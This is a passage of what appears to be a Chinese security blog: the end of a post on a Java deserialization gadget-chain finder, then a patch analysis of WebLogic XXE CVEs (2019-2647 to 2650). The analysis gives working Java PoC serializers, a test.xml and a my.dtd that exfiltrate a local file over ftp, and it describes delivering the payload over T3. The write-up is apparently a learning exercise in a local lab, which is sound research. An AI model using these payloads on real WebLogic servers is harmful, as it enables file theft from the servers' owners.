class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">FnEval.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnEval</span> <span class="keyword">implements</span> <span class="title">IFn</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FnEval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">interface</span> <span class="title">ExecCmd</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">callExec</span><span class="params">(ExecCmd execCmd, String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> execCmd.exec(cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> callExec(<span class="keyword">new</span> ExecCmd() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, (String) arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>经过测试，没有检测到这条利用链。说明目前语法分析那一块还没有对匿名内部类的分析。</p><h3 id="sink-gt-source"><a href="#sink-gt-source" class="headerlink" title="sink-&gt;source?"></a>sink-&gt;source?</h3><p>既然能source-&gt;sink，那么能不能sink-&gt;source呢？因为搜索source-&gt;sink时，source和sink都是已知的，如果搜索sink-&gt;source时，sink与soure也是已知的，那么source-&gt;sink与sink-&gt;source好像没有什么区别？如果能将source总结为参数可控的一类特征，那么sink-&gt;source这种方式是一种非常好的方式，不仅能用在反序列化漏洞中，还能用在其他漏洞中（例如模板注入）。但是这里也还有一些问题，比如反序列化是将this以及类的属性都当作了0参，因为反序列化时这些都是可控的，但是在其他漏洞中这些就不一定可控了。</p><p>目前还不知道具体如何实现以及会有哪些问题，暂时先不写。</p><h3 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h3><p>目前还没有做过大量测试，只是从宏观层面分析了这个工具的大致原理。结合平安集团<a href="https://mp.weixin.qq.com/s/RD90-78I7wRogdYdsB-UOg" target="_blank" rel="noopener">分析文章</a>以及上面的测试目前可以总结出一下几个缺点（不止这些缺陷）：</p><ul><li>callgraph生成不完整</li><li>调用链搜索结果不完整，这是由于查找策略导致的</li><li>一些特殊语法、匿名内部类还不支持</li><li>…</li></ul><h3 id="设想与改进"><a href="#设想与改进" class="headerlink" title="设想与改进"></a>设想与改进</h3><ul><li><p>对以上几个缺陷进行改进</p></li><li><p>结合已知的利用链(如ysoserial等)不断测试</p></li><li><p>尽可能列出所有链并结合人工筛选判断，而作者使用的策略是只要经过这个节点有一条链，其他链经过这个节点时就不再继续寻找下去。主要解决的就是最后那个调用链环路问题，目前看到几种方式：</p><ul><li>DFS+最大深度限制</li><li>继续使用BFS，人工检查生成的调用链，把无效的callgraph去掉，重复运行</li><li>调用链缓存（这一个暂时还没明白具体怎么解决环路的，只是看到了这个方法）</li></ul><p>我的想法是在每条链中维持一个黑名单，每次都检查是否出现了环路，如果在这条链中出现了环路，将造成环路的节点加入黑名单，继续使其走下去。当然虽然没有了环，也能会出现路径无限增长的情况，所以还是需要加入路径长度限制。</p></li><li><p>尝试sink-&gt;source的实现</p></li><li><p>多线程同时搜索多条利用链加快速度</p></li><li><p>…</p></li></ul><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>在原理分析的时候，忽略了字节码分析的细节，有的地方只是暂时猜测与测试得出的结果，所以可能存在一些错误。字节码分析那一块是很重要的一环，它对污点的判断、污点的传递调用等起着很重要的作用，如果这些部分出现了问题，整个搜索过程就会出现问题。由于ASM框架对使用人员要求较高，所以需要要掌握JVM相关的知识才能较好使用ASM框架，所以接下来的就是开始学习JVM相关的东西。这篇文章只是从宏观层面分析这个工具的原理，也算是给自己增加些信心，至少明白这个工具不是无法理解和无法改进的，同时后面再接触这个工具进行改进时也会间隔一段时间，回顾起来也方便，其他人如果对这个工具感兴趣也可以参考。等以后熟悉并能操纵Java字节码了，在回头来更新这篇文章并改正可能有错误的地方。</p><p>如果这些设想与改进真的实现并且进行了验证，那么这个工具真的是一个得力帮手。但是这些东西要实现还有较长的一段路要走，还没开始实现就预想到了那么多问题，在实现的时候会遇到更多问题。不过好在有一个大致的方向了，接下来就是对各个环节逐一解决了。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></li><li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf</a></li><li><a href="https://www.youtube.com/watch?v=wPbW6zQ52w8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wPbW6zQ52w8</a></li><li><a href="https://mp.weixin.qq.com/s/RD90-78I7wRogdYdsB-UOg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RD90-78I7wRogdYdsB-UOg</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>WebLogic CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650 XXE漏洞分析</title>
      <link href="/WebLogic%20CVE-2019-2647%E3%80%81CVE-2019-2648%E3%80%81CVE-2019-2649%E3%80%81CVE-2019-2650%20XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>@xxlegend在他的<a href="http://xxlegend.com/2019/04/19/weblogic%20CVE-2019-2647%E7%AD%89%E7%9B%B8%E5%85%B3XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">博客</a>分析了其中的一个XXE漏洞点，并给出了PoC，作为入门级的Java新手，在大佬分析的基础上再分析很适合学习Java漏洞</p></blockquote><p>Oracle发布了4月份的补丁，详情见链接(<a href="https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html#AppendixFMW" target="_blank" rel="noopener">https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html#AppendixFMW</a></p><a id="more"></a><p>@xxlegend在他的<a href="http://xxlegend.com/2019/04/19/weblogic%20CVE-2019-2647%E7%AD%89%E7%9B%B8%E5%85%B3XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">博客</a>分析了其中的一个XXE漏洞点，并给出了PoC。刚入手java不久，本着学习的目的，自己尝试分析了其他几个点的XXE并构造了PoC。下面的分析我尽量描述自己思考以及PoC构造过程，新手真的会踩很多莫名其妙的坑。感谢在复现与分析过程中为我提供帮助的小伙伴@Badcode，没有他的帮助我可能环境搭起来都会花费一大半时间。</p><h3 id="补丁分析，找到漏洞点"><a href="#补丁分析，找到漏洞点" class="headerlink" title="补丁分析，找到漏洞点"></a>补丁分析，找到漏洞点</h3><p>根据JAVA常见XXE写法与防御方式(参考<a href="https://blog.spoock.com/2018/10/23/java-xxe/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/23/java-xxe/</a>)，通过对比补丁，发现新补丁以下四处进行了<code>setFeature</code>操作:</p><p><img src="../images/weblogic-xxe/1.png" alt=""></p><p>应该就是对应的四个CVE了，其中<code>ForeignRecoveryContext</code>@xxlegend大佬已经分析过了，这里就不再分析了，下面主要是分析下其他三个点</p><h3 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h3><ul><li>Windows 10</li><li>WebLogic 10.3.6.0</li><li>Jdk160_29（WebLogic 10.3.6.0自带的JDK）</li></ul><h3 id="WsrmServerPayloadContext-漏洞点分析"><a href="#WsrmServerPayloadContext-漏洞点分析" class="headerlink" title="WsrmServerPayloadContext 漏洞点分析"></a>WsrmServerPayloadContext 漏洞点分析</h3><p><code>WsrmServerPayloadContext</code>修复后的代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic.wsee.reliability;</span><br><span class="line"><span class="keyword">import</span> ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WsrmServerPayloadContext</span> <span class="keyword">extends</span> <span class="title">WsrmPayloadContext</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> EndpointReference <span class="title">readEndpt</span><span class="params">(ObjectInput var1, <span class="keyword">int</span> var2)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            ByteArrayInputStream var15 = <span class="keyword">new</span> ByteArrayInputStream(var3);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                DocumentBuilderFactory var7 = DocumentBuilderFactory.newInstance();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    String var8 = <span class="string">"http://xml.org/sax/features/external-general-entities"</span>;</span><br><span class="line">                    var7.setFeature(var8, <span class="keyword">false</span>);</span><br><span class="line">                    var8 = <span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>;</span><br><span class="line">                    var7.setFeature(var8, <span class="keyword">false</span>);</span><br><span class="line">                    var8 = <span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>;</span><br><span class="line">                    var7.setFeature(var8, <span class="keyword">false</span>);</span><br><span class="line">                    var7.setXIncludeAware(<span class="keyword">false</span>);</span><br><span class="line">                    var7.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">                        Verbose.log(<span class="string">"Failed to set factory:"</span> + var11);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到进行了<code>setFeature</code>操作防止xxe攻击，而未打补丁之前是没有进行<code>setFeature</code>操作的</p><p><code>readExternal</code>在反序列化对象时会被调用，与之对应的<code>writeExternal</code>在序列化对象时会被调用，看下<code>writeExternal</code>的逻辑:</p><p><img src="../images/weblogic-xxe/2.png" alt=""></p><p><code>var1</code>就是<code>this.formENdpt</code>，注意<code>var5.serialize</code>可以传入三种类型的对象，<code>var1.getEndptElement()</code>返回的是<code>Element</code>对象，先尝试新建一个项目构造一下<code>PoC</code>:</p><p>结构如下</p><p><img src="../images/weblogic-xxe/4.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">images</span>/<span class="title">weblogic</span>-<span class="title">xxe1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Object instance = getXXEObject();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"xxe"</span>));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyEndpointReference</span> <span class="keyword">extends</span> <span class="title">EndpointReference</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Element <span class="title">getEndptElement</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>.getEndptElement();</span><br><span class="line">            Document doc = <span class="keyword">null</span>;</span><br><span class="line">            Element element = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">                <span class="comment">//从DOM工厂中获得DOM解析器</span></span><br><span class="line">                DocumentBuilder dbBuilder = dbFactory.newDocumentBuilder();</span><br><span class="line">                <span class="comment">//创建文档树模型对象</span></span><br><span class="line">                doc = dbBuilder.parse(<span class="string">"test.xml"</span>);</span><br><span class="line">                element = doc.getDocumentElement();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> element;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getXXEObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        EndpointReference fromEndpt = (EndpointReference) <span class="keyword">new</span> MyEndpointReference();</span><br><span class="line"></span><br><span class="line">        EndpointReference faultToEndpt = <span class="keyword">null</span>;</span><br><span class="line">        WsrmServerPayloadContext wspc = <span class="keyword">new</span> WsrmServerPayloadContext();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Field f1 = wspc.getClass().getDeclaredField(<span class="string">"fromEndpt"</span>);</span><br><span class="line">            f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f1.set(wspc, fromEndpt);</span><br><span class="line"></span><br><span class="line">            Field f2 = wspc.getClass().getDeclaredField(<span class="string">"faultToEndpt"</span>);</span><br><span class="line">            f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f2.set(wspc, faultToEndpt);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> wspc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.xml内容如下，my.dtd暂时为空就行，先测试能否接收到请求:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE data SYSTEM "http://127.0.0.1:8000/my.dtd" [</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT data (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行PoC，生成的反序列化数据xxe，使用十六进制查看器打开:</p><p><img src="../images/weblogic-xxe/3.png" alt=""></p><p>发现DOCTYPE无法被引入</p><p>我尝试了下面几种方法：</p><ul><li><p>在上面说到<code>var5.serialize</code>可以传入<code>Document</code>对象，测试了下，的确可以，但是如何使<code>getEndptElement</code>返回一个<code>Document</code>对象呢？</p><ul><li>尝试了自己创建一个<code>EndpointReference</code>类，修改<code>getEndptElement</code>返回对象，内容和原始内容一样，但是在反序列化时找不到我创建的类，原因是自己建的类<code>package</code>与原来的不同，所以失败了</li><li>尝试像Python那样动态替换一个类的方法，貌似Java好像做不到…</li></ul></li><li><p>尝试了一个暴力的方法，替换Jar包中的类。首先复制出Weblogic的<code>modules</code>文件夹与<code>wlserver_10.3\server\lib</code>文件夹到另一个目录，将<code>wlserver_10.3\server\lib\weblogic.jar</code>解压，将<code>WsrmServerPayloadContext.class</code>类删除，重新压缩为<code>weblogic.Jar</code>，然后新建一个项目，引入需要的Jar文件（<code>modules</code>和<code>wlserver_10.3\server\lib</code>中所有的Jar包），然后新建一个与<code>WsrmServerPayloadContext.class</code>同样的包名，在其中新建<code>WsrmServerPayloadContext.class</code>类，复制原来的内容进行修改(修改只是为了生成能触发xml解析的数据，对<code>readExternal</code>反序列化没有影响)。</p><p><code>WsrmServerPayloadContext.class</code>修改的内容如下:</p><p><img src="../images/weblogic-xxe/6.png" alt=""></p></li><li><p>经过测试第二种方式是可行的，但是好像过程略复杂。然后尝试了下新建一个与原始<code>WsrmServerPayloadContext.class</code>类同样的包名，然后进行修改，修改内容与第二种方式一样</p><p><img src="../images/weblogic-xxe/12.png" alt=""></p><p>测试这种方式也是可行的，比第二种方式操作起来方便些</p></li></ul><p>构造新的PoC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">images</span>/<span class="title">weblogic</span>-<span class="title">xxe1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Object instance = getXXEObject();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"xxe"</span>));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getXXEObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        EndpointReference fromEndpt = <span class="keyword">new</span> EndpointReference();</span><br><span class="line"></span><br><span class="line">        EndpointReference faultToEndpt = <span class="keyword">null</span>;</span><br><span class="line">        WsrmServerPayloadContext wspc = <span class="keyword">new</span> WsrmServerPayloadContext();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Field f1 = wspc.getClass().getDeclaredField(<span class="string">"fromEndpt"</span>);</span><br><span class="line">            f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f1.set(wspc, fromEndpt);</span><br><span class="line"></span><br><span class="line">            Field f2 = wspc.getClass().getDeclaredField(<span class="string">"faultToEndpt"</span>);</span><br><span class="line">            f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f2.set(wspc, faultToEndpt);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> wspc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看下新生成的xxe十六进制:</p><p><img src="../images/weblogic-xxe/7.png" alt=""></p><p>DOCTYPE被写入了</p><p>测试下，使用T3协议脚本向WebLogic 7001端口发送序列化数据:</p><p><img src="../images/weblogic-xxe/11.png" alt=""></p><p><img src="../images/weblogic-xxe/10.png" alt=""></p><p>漂亮，接收到请求了，接下来就是尝试下到底能不能读取到文件了</p><p>构造的test.xml如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY % file SYSTEM "file:///C:Users/dell/Desktop/test.txt"&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/my.dtd"&gt;</span></span><br><span class="line"><span class="meta">        %dtd;</span></span><br><span class="line"><span class="meta">        %send;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ANY</span>&gt;</span>xxe<span class="tag">&lt;/<span class="name">ANY</span>&gt;</span></span><br></pre></td></tr></table></figure><p>my.dtd如下(my.dtd在使用PoC生成反序列化数据的时候先清空，然后，不然在<code>dbBuilder.parse</code>时会报错无法生成正常的反序列化数据，至于为什么，只有自己测试下才会明白):</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">all</span></span></span><br><span class="line">"&lt;!ENTITY &amp;#x25; send SYSTEM 'ftp://127.0.0.1:2121/%file;'&gt;"</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>运行PoC生成反序列化数据，测下发现请求都接收不到了…，好吧，查看下十六进制:</p><p><img src="../images/weblogic-xxe/13.png" alt=""></p><p><code>%dtd;%send;</code>居然不见了…，可能是因为DOM解析器的原因，my.dtd内容为空，数据没有被引用。</p><p>尝试debug看下:</p><p><img src="../images/weblogic-xxe/22.png" alt=""></p><p>可以看到<code>%dtd;%send;</code>确实是被处理掉了</p><p>测试下正常的加载外部数据，my.dtd改为如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">all</span></span></span><br><span class="line">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://127.0.0.1:8000/gen.xml'&gt;"</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>gen.xml为:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>debug看下:</p><p><img src="../images/weblogic-xxe/23.png" alt=""></p><p>可以看到<code>%dtd;%send;</code>被my.dtd里面的内容替换了。debug大致看了xml解析过程，中间有一个<code>EntityScanner</code>，会检测xml中的ENTITY，并且会判断是否加载了外部资源，如果加载了就外部资源加载进来，后面会将实体引用替换为实体申明的内容。也就是说，我们构造的反序列化数据中的xml数据，已经被解析过一次了，而需要的是没有被解析过的数据，让目标去解析。</p><p>所以我尝试修改了十六进制如下，使得xml修改成没有被解析的形式:</p><p><img src="../images/weblogic-xxe/14.png" alt=""></p><p>运行PoC测试下，</p><p><img src="../images/weblogic-xxe/15.png" alt=""></p><p><img src="../images/weblogic-xxe/16.png" alt=""></p><p><img src="../images/weblogic-xxe/17.png" alt=""></p><p>居然成功了，一开始以为反序列化生成的xml数据那块还会进行校验，不然反序列化不了，直接修改数据是不行的，没想到直接修改就可以了</p><h3 id="UnknownMsgHeader-漏洞点分析"><a href="#UnknownMsgHeader-漏洞点分析" class="headerlink" title="UnknownMsgHeader 漏洞点分析"></a>UnknownMsgHeader 漏洞点分析</h3><p>与<code>WsrmServerPayloadContext</code>差不多，PoC构造也是新建包然后替换，就不详细分析了，只说下类修改的地方与PoC构造</p><p>新建<code>UnknownMsgHeader</code>类，修改<code>writeExternal</code></p><p><img src="../images/weblogic-xxe/18.png" alt=""></p><p>PoC如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">images</span>/<span class="title">weblogic</span>-<span class="title">xxe2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Object instance = getXXEObject();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"xxe"</span>));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getXXEObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        QName qname = <span class="keyword">new</span> QName(<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>);</span><br><span class="line">        Element xmlHeader = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        UnknownMsgHeader umh = <span class="keyword">new</span> UnknownMsgHeader();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field f1 = umh.getClass().getDeclaredField(<span class="string">"qname"</span>);</span><br><span class="line">            f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f1.set(umh, 